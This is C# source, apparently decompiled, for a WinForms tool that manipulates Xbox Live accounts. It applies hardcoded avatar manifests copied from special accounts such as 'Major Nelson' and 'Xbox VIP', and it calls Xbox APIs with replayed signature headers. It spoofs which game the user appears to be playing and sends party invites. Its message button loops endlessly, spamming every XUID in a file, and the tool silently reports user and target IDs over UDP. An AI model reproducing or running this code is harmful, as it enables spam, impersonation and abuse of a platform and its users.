        this.AvitarManifestTxt.Text = "AAAAAL8AAAA/gAAAABAAAAMcAAPByPEJoZyy4AAIAAADJQADwcjxCaGcsuAAIAAAAzgAA8HI8QmhnLLgAACAAALyAAPByPEJoZyy4AAAAAAAAAAAAAAAAAAAAAAAACAAAoYAA8HI8QmhnLLgAAAAAAAAAAAAAAAAAAAAAAAAQAACagADwcjxCaGcsuAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAocAA8HI8QmhnLLgAAAAAAAAAAAAAAAAAAAAAAACAAADEQADwcjxCaGcsuAAAAAAAAAAAAAAAAAAAAAA/wAAAP/i3t3/AAAA//8KCv8AAAD/AAAA/+Le3f8AAAD/AAAAAAAAAgAAAAHByPEJoZyy4AACAAAAAAAAAAAAAAAAAAAAAAABAAIAA8HI8QmhnLLgAAEAAAAAAAAAAAAAAAAAAAAAAAQB1wADwcjxCaGcsuAABAAAAAAAAAAAAAAAAAAAAAAIAAD6AAHByPEJoZyy4AgAAAAAAAAAAAAAAAAAAAAAgAI4ALIAAcHI8QmhnLLgAjgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAzAAHByPEJoZyy4AAgAAAAAAAAAAAAAAAAAAAAAAAQAKAAAcHI8QmhnLLgABAAAAAAAAAAAAAAAAAAAAAAAAgAUAABwcjxCaGcsuAACAAAAAAAAAAAAAAAAAAAAAAABAHXAAPByPEJoZyy4AAEAAAAAAAAAAAAAAAAAADrdUi2EC6nQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==";
      if (this.AvatarChoice.Text == "XBLPET ALPHA")
        this.AvitarManifestTxt.Text = "AAAAAD8AAAA/gAAAABAAAAMhAAPByPEJoZyy4AAIAAADMAADwcjxCaGcsuAAIAAAAzsAA8HI8QmhnLLgAACAAALqAAPByPEJoZyy4D+AAAAAAAAAAAAAAAAAAAAAACAAAowAA8HI8QmhnLLgAAAAAAAAAAAAAAAAAAAAAAAAQAACbgADwcjxCaGcsuAAAAAAAAAAAAAAAAAAAAAAAAEAAALVAAHByPEJoZyy4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/gAAAAAAAAAAAAAAAAAAA//Czk/8NDQ3/rS0t/zdRKv8NDQ3/91qH/w0NDf/XX0f/119HAAAAAgAAAAHByPEJoZyy4AACAAAAAAAAAAAAAAAAAAAAAAABAAIAA8HI8QmhnLLgAAEAAAAAAAAAAAAAAAAAAAAAAAQCAAADwcjxCaGcsuAABAAA/w0NDf8NDQ3/DQ0NAAACeP4FwrHKeZvjWFgIggJ4AAAAAAAAAAAAAAAAAAAAAAgAAPUAAcHI8QmhnLLgCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAuAAHByPEJoZyy4AAgAAAAAAAAAAAAAAAAAAAAAAAQAKMAAcHI8QmhnLLgABAAAAAAAAAAAAAAAAAAAAAAAAgAVgABwcjxCaGcsuAACAAAAAAAAAAAAAAAAAAAAAAABAIAAAPByPEJoZyy4AAEAAAAAAAAAAAAAAAAAADtOuDuma++WAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==";
      if (this.AvatarChoice.Text == "Major Nelson")
        this.AvitarManifestTxt.Text = "AAAAAAAAAAA/gAAAABAAAAMcAAPByPEJoZyy4AAIAAADLAADwcjxCaGcsuAAIAAAAzYAA8HI8QmhnLLgAACAAAL6AAPByPEJoZyy4AAAAAAAAAAAAAAAAAAAAAAAACAAAroAA8HI8QmhnLLgAAAAAAAAAAAAAAAAAAAAAAAAQAACagADwcjxCaGcsuAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAADFQADwcjxCaGcsuAAAAAAAAAAAAAAAAAAAAAA/9eqcf9PRj3/tWFX/ypypP9JNCH/YXAf/2gmGP/PWWn/z1lpAAAAAgAAAAHByPEJoZyy4AACAAAAAAAAAAAAAAAAAAAAAAABAAIAA8HI8QmhnLLgAAEAAAAAAAAAAAAAAAAAAAAAEADpXjJDycthA1BTB9EQAAAA////////////////AAAHfKVAcpHLOEjJWFgIWwd8AAD//wAA/wD/AP8AAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIGM6YqHOvZjORE0H0QAgAAD/AAAA/wAAAP8AAAAAAAAQAKEAAcHI8QmhnLLgABAAAAAAAAAFyNvwAAACSQAAAAi6RsJBzxeZkVhYCBwACAAA//8AAP8A/wD/AAD/AAAABAHMAAPByPEJoZyy4AAEAAAAAAAAAAAAAAAAAAAAAAAAADH97u7uLgkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==";
      if (this.AvatarChoice.Text == "Xbox VIP")
        this.AvitarManifestTxt.Text = "AAAAAL+AAAA/gAAAABAAAAMcAAPByPEJoZyy4AAIAAADLwADwcjxCaGcsuAAIAAAAzcAA8HI8QmhnLLgAACAAALoAAPByPEJoZyy4D+AAAAAAAAAAAAAAAAAAAAAACAAAqQAA8HI8QmhnLLgP4AAAAAAAAAAAAAAAAAAAAAAQAACaQADwcjxCaGcsuA/gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAADEQADwcjxCaGcsuA/gAAAAAAAAAAAAAAAAAAA//jbuf8NDQ3/ihoO/yEhIf8NDQ3/s31Z/2gmGP/str7/7La+AAAAAgAAAAHByPEJoZyy4AACAAAAAAAAAAAAAAAAAAAAAAABAAIAA8HI8QmhnLLgAAEAAAAAAAAAAAAAAAAAAAAAABAAoAABwcjxCaGcsuAAEAAA/wAAAP8AAAD/AAAAAAAAIAA6AAHByPEJoZyy4AAgAAD/AAAA/wAAAP8AAAAAAAgAAPkAAcHI8QmhnLLgCAAAAP8AAAD/AAAA/wAAAAAABUR6VYLzylrQ+k1TCFsFRAAAAAAAAAAAAAAAAAAAAAACCG40sgHGtltHWFgIHAIIAAAAAAAAAAAAAAAAAAAAABAA+5EiU8R1UTtYWAgcEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAA6AAHByPEJoZyy4AAgAAD/AAAA/wAAAP8AAAAAAAAQAKAAAcHI8QmhnLLgABAAAP8AAAD/AAAA/wAAAAAAAAgAZQABwcjxCaGcsuAACAAAAAAAAAAAAAAAAAAAAAAABAJTAAPByPEJoZyy4AAEAAD/DQ0N/w0NDf8NDQ3sjPl20LRGfAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==";
      if (!(this.AvatarChoice.Text == "XBLPET ALPHA"))
        return;
      this.AvitarManifestTxt.Text = "AAAAAL+AAAA/gAAAABAAAAMhAAPByPEJoZyy4AAIAAADKwADwcjxCaGcsuAAIAAAAzsAA8HI8QmhnLLgAACAAAL6AAPByPEJoZyy4AAAAAAAAAAAAAAAAAAAAAAAACAAAqYAA8HI8QmhnLLgAAAAAAAAAAAAAAAAAAAAAAAAQAACZAADwcjxCaGcsuA/gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/9eqcf83IRb/tWFX/zdRKv9JNCH/U5XK/0k0If/PWWn/z1lpAAAAAgAAAAHByPEJoZyy4AACAAAAAAAAAAAAAAAAAAAAAAABAAIAA8HI8QmhnLLgAAEAAAAAAAAAAAAAAAAAAAAAACAAMQABwcjxCaGcsuAAIAAAAAAAAAAAAAAAAAAAAAAABAHoAAPByPEJoZyy4AAEAAAAAAAAAAAAAAAAAAAAAAAQAKAAAcHI8QmhnLLgABAAAAAAAAAAAAAAAAAAAAAAAAivQTJxy6U0j1hYCBwACAAA//8AAP8A/wD/AAD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAxAAHByPEJoZyy4AAgAAAAAAAAAAAAAAAAAAAAAAAQAKAAAcHI8QmhnLLgABAAAAAAAAAAAAAAAAAAAAAAAAivQTJxy6U0j1hYCBwACAAA//8AAP8A/wD/AAD/AAAABAHoAAPByPEJoZyy4AAEAAAAAAAAAAAAAAAAAADqXlknuuyy9gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==";
    }

    private void ProfileInfo(string xuid)
    {
      HttpWebRequest httpWebRequest = WebRequest.Create("https://peoplehub.xboxlive.com/users/me/people/xuids(" + xuid + ")/decoration/RealNameOverride,broadcast,detail,multiplayersummary,preferredcolor,socialManager,tournamentSummary") as HttpWebRequest;
      httpWebRequest.Method = "GET";
      httpWebRequest.Headers.Add("x-xbl-contract-version", "1");
      httpWebRequest.Headers.Add("Accept-Encoding", "gzip; q=1.0, deflate; q=0.5, identity; q=0.1");
      httpWebRequest.Headers.Add("Accept-Language", "en-US, en, en-AU, en");
      httpWebRequest.Headers.Add("Authorization", Settings.Default.authxsts);
      httpWebRequest.Headers.Add("Signature", "AAAAAQHW0Zzb5TQBf9TLmReR62PYoOpscvtjUKjNjXl0Un5Eyi5Vrk2klBrnllMW4N/UsTxpB945Q2y2l9xQ6MYYqkHlIsDKOhUw6g==");
      string end = new StreamReader(httpWebRequest.GetResponse().GetResponseStream()).ReadToEnd();
      string str1 = this.FindTextBetween(end, "displayPicRaw", ",").Replace("\"", "").Replace(":", "").Replace("https", "https:");
      string str2 = this.FindTextBetween(end, "displayName", ",").Replace("\"", "").Replace(":", "");
      string str3 = this.FindTextBetween(end, "realName", ",").Replace("\"", "").Replace(":", "");
      string str4 = this.FindTextBetween(end, "gamertag", ",").Replace("\"", "").Replace(":", "");
      string str5 = this.FindTextBetween(end, "xboxOneRep", ",").Replace("\"", "").Replace(":", "");
      string str6 = this.FindTextBetween(end, "presenceState", ",").Replace("\"", "").Replace(":", "");
      string str7 = this.FindTextBetween(end, "presenceText", ",").Replace("\"", "").Replace(":", "");
      string str8 = this.FindTextBetween(end, "gamerScore", ",").Replace("\"", "").Replace(":", "");
      string str9 = this.FindTextBetween(end, "primaryColor", ",").Replace("\"", "").Replace(":", "");
      string str10 = this.FindTextBetween(end, "secondaryColor", ",").Replace("\"", "").Replace(":", "");
      string str11 = this.FindTextBetween(end, "tertiaryColor", ",").Replace("\"", "").Replace("}", "").Replace(":", "");
      string str12 = this.FindTextBetween(end, "bio", ",").Replace("\"", "").Replace(":", "");
      string str13 = this.FindTextBetween(end, "location", ",").Replace("\"", "").Replace(":", "");
      this.BIO.Clear();
      this.BIO.AppendText(str12 ?? "");
      this.XboxProfilePic.ImageLocation = str1;
      this.Avi.ImageLocation = "http://avatar.xboxlive.com/avatar/" + str4 + "/avatar-body.png";
      this.ProfileLocation.Text = str13;
      this.DisplayName.Text = "Display Name:" + str2;
      this.RealName.Text = "Real Name:" + str3;
      this.ProfileGamertag.Text = "Gamertag:" + str4;
      this.XboxOneRep.Text = "Xbox One Rep:" + str5;
      this.PresenceState.Text = "Presence State:" + str6;
      this.PresenceText.Text = "Presence Text:" + str7;
      this.GamerScore.Text = "GamerScore:" + str8;
      string str14 = "#" + str9;
      string str15 = "#" + str10;
      string str16 = "#" + str11;
    }

    private void SetActivity(string ActivityStatus, string me)
    {
      int length = ActivityStatus.Length;
      HttpWebRequest httpWebRequest = WebRequest.Create("https://userposts.xboxlive.com/users/me/posts") as HttpWebRequest;
      httpWebRequest.Method = "POST";
      httpWebRequest.Headers.Add("x-xbl-contract-version", "2");
      httpWebRequest.Headers.Add("Authorization", Settings.Default.authxsts);
      httpWebRequest.Headers.Add("Accept-Encoding", "gzip; q=1.0, deflate; q=0.5, identity; q=0.1");
      httpWebRequest.Headers.Add("x-xbl-contentrestrictions", "AAAAAQHWz5NlGHSiGhEEoMhfRFSXomRyncvTZ/dwjSwRdWj5PAYDZ3aYuXCFbMii5hU0gjdfTSj67IjB0AbaxFBUgBg48qk9Z7hHIQ==");
      httpWebRequest.Accept = "application/json";
      httpWebRequest.Headers.Add("Accept-Language", "en-AU");
      httpWebRequest.ContentType = "application/json; charset=UTF-8";
      httpWebRequest.Headers.Add("Signature", "AAAAAQHW2C1LIpyKxv5Df959zyagl/3inukMcNNILMqAu96hAxSv8a45RMv/Fk4qqr0L5nqrbR6nHQpPctxDwIgi1zbOycK/uoUtpw==");
      httpWebRequest.Headers.Add("Cache-Control", "no-store, must-revalidate, no-cache");
      httpWebRequest.ContentLength = (long) (104 + length);
      using (StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
      {
        string str = "{\"postType\":\"Text\",\"postText\":\"" + ActivityStatus + "\",\"timelines\":[{\"timelineType\":\"User\",\"timelineOwner\":" + me + "}]}";
        streamWriter.Write(str);
        streamWriter.Flush();
      }
    }

    private void SetBio(string bio)
    {
      int length = bio.Length;
      HttpWebRequest httpWebRequest = WebRequest.Create("https://profile.xboxlive.com/users/me/profile/settings/Bio") as HttpWebRequest;
      httpWebRequest.Method = "POST";
      httpWebRequest.Headers.Add("x-xbl-contract-version", "3");
      httpWebRequest.Headers.Add("Authorization", Settings.Default.authxsts);
      httpWebRequest.Headers.Add("Accept-Encoding", "gzip, deflate");
      httpWebRequest.Headers.Add("x-xbl-contentrestrictions", "AAAAAQHWz5NlGHSiGhEEoMhfRFSXomRyncvTZ/dwjSwRdWj5PAYDZ3aYuXCFbMii5hU0gjdfTSj67IjB0AbaxFBUgBg48qk9Z7hHIQ==");
      httpWebRequest.Accept = "application/json, text/plain, */*";
      httpWebRequest.Headers.Add("Accept-Language", "en-AU");
      httpWebRequest.ContentType = "application/json; charset=UTF-8";
      httpWebRequest.Headers.Add("Signature", "AAAAAQHW2C1LIpyKxv5Df959zyagl/3inukMcNNILMqAu96hAxSv8a45RMv/Fk4qqr0L5nqrbR6nHQpPctxDwIgi1zbOycK/uoUtpw==");
      httpWebRequest.Headers.Add("Cache-Control", "no-cache");
      httpWebRequest.ContentLength = (long) (39 + length);
      using (StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
      {
        string str = "{\"userSetting\":{\"id\":\"Bio\",\"value\":\"" + bio + "\"}}";
        streamWriter.Write(str);
        streamWriter.Flush();
      }
    }

    private void SendMessages(string me, string target, string Message)
    {
      int length = Message.Length;
      HttpWebRequest httpWebRequest = WebRequest.Create("https://xblmessaging.xboxlive.com/network/xbox/users/xuid(" + me + ")/conversations/users/xuid(" + target + ")") as HttpWebRequest;
      httpWebRequest.Method = "POST";
      httpWebRequest.Headers.Add("x-xbl-contract-version", "1");
      httpWebRequest.Headers.Add("Authorization", Settings.Default.authxsts);
      httpWebRequest.Headers.Add("Accept-Encoding", "gzip, deflate");
      httpWebRequest.Headers.Add("x-xbl-contentrestrictions", "AAAAAQHWz5NlGHSiGhEEoMhfRFSXomRyncvTZ/dwjSwRdWj5PAYDZ3aYuXCFbMii5hU0gjdfTSj67IjB0AbaxFBUgBg48qk9Z7hHIQ==");
      httpWebRequest.Accept = "application/json";
      httpWebRequest.ContentType = "application/json; charset=UTF-8";
      httpWebRequest.Headers.Add("Signature", "AAAAAQHW2C1LIpyKxv5Df959zyagl/3inukMcNNILMqAu96hAxSv8a45RMv/Fk4qqr0L5nqrbR6nHQpPctxDwIgi1zbOycK/uoUtpw==");
      httpWebRequest.Headers.Add("PRAGMA", "no-cache");
      httpWebRequest.Headers.Add("Cache-Control", "no-cache");
      httpWebRequest.ContentLength = (long) (56 + length);
      using (StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
      {
        string str = "{\"parts\":[{\"text\":\"" + Message + "\",\"contentType\":\"text\",\"version\":0}]}";
        streamWriter.Write(str);
        streamWriter.Flush();
      }
      httpWebRequest.Abort();
    }

    private void AvatarInfo(string XUID)
    {
      HttpWebRequest httpWebRequest = WebRequest.Create("https://avatarservices.xboxlive.com/users/xuid(" + XUID + ")/avatar/manifest") as HttpWebRequest;
      httpWebRequest.Method = "GET";
      httpWebRequest.Headers.Add("x-xbl-contract-version", "3");
      httpWebRequest.Headers.Add("Accept-Encoding", "gzip; q=1.0, deflate; q=0.5, identity; q=0.1");
      httpWebRequest.Headers.Add("Accept-Language", "en-AU, en");
      httpWebRequest.Headers.Add("Authorization", Settings.Default.authxsts);
      httpWebRequest.Headers.Add("Signature", "AAAAAQHW0Zzb5TQBf9TLmReR62PYoOpscvtjUKjNjXl0Un5Eyi5Vrk2klBrnllMW4N/UsTxpB945Q2y2l9xQ6MYYqkHlIsDKOhUw6g==");
      FormMain.AvatarManifest = (this.FindTextBetween(new StreamReader(httpWebRequest.GetResponse().GetResponseStream()).ReadToEnd(), "manifest", "==").Replace("\"", "").Replace(":", "") + "==").Replace("{manifest", "");
      System.IO.File.AppendAllText("history.txt", Constants.Profile.Xuid + "'s Avatar Manifest:" + FormMain.AvatarManifest + "\n");
    }

    private async void LookupProfileBtn_Click(object sender, EventArgs e)
    {
      User.ProfileModel profile = await Xbox.GetProfileByGamertagAsync(this.GamertagProfileLookupName.Text);
      string XUID = profile.Profile.Xuid;
      this.ProfileInfo(XUID);
      this.AvatarInfo(XUID);
      profile = (User.ProfileModel) null;
      XUID = (string) null;
    }

    private void ViewMyProfileBtn_Click(object sender, EventArgs e)
    {
      this.AvatarInfo(Constants.Profile.Xuid);
      this.ProfileInfo(Constants.Profile.Xuid);
    }

    private void button34_Click(object sender, EventArgs e) => Xbox.setavatar(Constants.Profile.Xuid, this.AvitarManifestTxt.Text);

    private void metroCheckBox1_CheckedChanged(object sender, EventArgs e)
    {
      if (this.metroCheckBox1.Checked)
        this.label5.Text = "IP hidden";
      else
        this.label5.Text = "Public IP:" + new WebClient().DownloadString("http://icanhazip.com");
    }

    private void CopyAvatarBtn_Click(object sender, EventArgs e) => Clipboard.SetText(FormMain.AvatarManifest);

    private void SetBioBtn_Click(object sender, EventArgs e) => this.SetBio(this.BIO.Text);

    private async void SendMsgBtn_Click(object sender, EventArgs e)
    {
      while (true)
      {
        string[] lines = System.IO.File.ReadAllLines(Application.StartupPath + "\\XUIDs.txt");
        string[] strArray = lines;
        for (int index = 0; index < strArray.Length; ++index)
        {
          string line = strArray[index];
          this.SendMessages(Constants.Profile.Xuid, line, this.MsgGamertagMsg.Text);
          await Task.Delay(1250);
          line = (string) null;
        }
        strArray = (string[]) null;
        lines = (string[]) null;
      }
    }

    private async void InviteGamertagBtn_Click(object sender, EventArgs e)
    {
      string gamertag = this.PartyGTTxt.Text;
      try
      {
        byte[] sendBytes = Encoding.ASCII.GetBytes("StasisUser[" + Constants.Profile.Xuid + "] Invited:[" + gamertag + "] to party");
        this.udpClient.Send(sendBytes, sendBytes.Length);
        sendBytes = (byte[]) null;
      }
      catch
      {
      }
      User.ProfileModel profile = await Xbox.GetProfileByGamertagAsync(gamertag);
      string XUID = profile.Profile.Xuid;
      await Xbox.partyInvite(XUID, Constants.Profile.Xuid);
      this.GrabParty(Constants.Profile.Xuid);
      gamertag = (string) null;
      profile = (User.ProfileModel) null;
      XUID = (string) null;
    }

    private void SpamInboxChx_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void LoadFriendsBtn_Click(object sender, EventArgs e)
    {
      this.LoadFriends();
      this.presence.state = "Scanning Friends List";
      DiscordRpc.UpdatePresence(ref this.presence);
    }

    private void SetActivityFeedBtn_Click(object sender, EventArgs e) => this.SetActivity(this.BIO.Text, Constants.Profile.Xuid);

    private void LoadFollowersBtn_Click(object sender, EventArgs e) => this.LoadFollowers();

    private void button27_Click_1(object sender, EventArgs e)
    {
    }

    private async void Presence(string TitleID, bool loop)
    {
      {
        HttpWebRequest request = WebRequest.Create("https://presence-heartbeat.xboxlive.com/users/xuid(" + Constants.Profile.Xuid + ")/devices/current") as HttpWebRequest;
        request.Method = "POST";
        request.Headers.Add("x-xbl-contract-version", "3");
        request.Headers.Add("Authorization", Settings.Default.authxsts);
        request.Headers.Add("Accept-Encoding", "gzip, deflate");
        request.Headers.Add("x-xbl-contentrestrictions", "AAAAAQHWz5NlGHSiGhEEoMhfRFSXomRyncvTZ/dwjSwRdWj5PAYDZ3aYuXCFbMii5hU0gjdfTSj67IjB0AbaxFBUgBg48qk9Z7hHIQ==");
        request.Accept = "application/json, text/plain, */*";
        request.Headers.Add("Accept-Language", "en-AU");
        request.ContentType = "application/json";
        request.Headers.Add("Signature", "AAAAAQHW2C1LIpyKxv5Df959zyagl/3inukMcNNILMqAu96hAxSv8a45RMv/Fk4qqr0L5nqrbR6nHQpPctxDwIgi1zbOycK/uoUtpw==");
        request.Headers.Add("Cache-Control", "no-cache");
        request.ContentLength = 83L;
        using (StreamWriter streamWriter = new StreamWriter(request.GetRequestStream()))
        {
          string json = "{\"titles\":[{\"expiration\":600,\"id\":" + FormMain.tid + ",\"state\":\"active\",\"sandbox\":\"RETAIL\"}]}";
          streamWriter.Write(json);
          streamWriter.Flush();
          json = (string) null;
        }
        request.Abort();
        await Task.Delay(35000);
        request = (HttpWebRequest) null;
      }
    }

    private void SpoofedTitleIDBtn_Click(object sender, EventArgs e)
    {
      this.loops = false;
      foreach (string readAllLine in System.IO.File.ReadAllLines(Application.StartupPath + "\\TitleIDs.txt"))
      {
        char[] chArray = new char[1]{ ',' };
        string[] source = readAllLine.Split(chArray);
        string str = ((IEnumerable<string>) source).First<string>();
        if (this.SpoofTitleIDCombo.Text == ((IEnumerable<string>) source).Last<string>())
        {
          this.loops = true;
          FormMain.tid = str;
        }
      }
    }

    private void StopSpoofingBtn_Click(object sender, EventArgs e) => this.Presence("1144039928", true);

    private void metroCheckBox2_CheckedChanged(object sender, EventArgs e) => this.Presence("1144039928", true);

    private void ConnectJtagBtn_Click(object sender, EventArgs e)
    {
    }

    private async void toolStripMenuItem3_Click(object sender, EventArgs e)
    {
      string GT = this.DataFriends.SelectedRows[0].Cells[0].Value.ToString();
      User.ProfileModel profile = await Xbox.GetProfileByGamertagAsync(GT);
      User.ProfileModel target = await Xbox.GetProfileByGamertagAsync(this.toolStripTextBox1.Text);
      await Xbox.partyInvite(target.Profile.Xuid, profile.Profile.Xuid);
      GT = (string) null;
      profile = (User.ProfileModel) null;
      target = (User.ProfileModel) null;
    }

    private void toolStripTextBox1_Click(object sender, EventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
            this.components = new System.ComponentModel.Container();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle1 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormMain));
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle8 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle10 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle11 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle12 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle13 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle14 = new System.Windows.Forms.DataGridViewCellStyle();
            this.SpoofIPandPortButton = new System.Windows.Forms.Button();
            this.LabelAuthor = new System.Windows.Forms.Label();
            this.ButtonRefreshParty = new System.Windows.Forms.Button();
            this.LabelClientCount = new System.Windows.Forms.Label();
            this.contextMenuStrip2 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.kickToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.LabelUsername = new System.Windows.Forms.Label();
            this.DataFriends = new System.Windows.Forms.DataGridView();
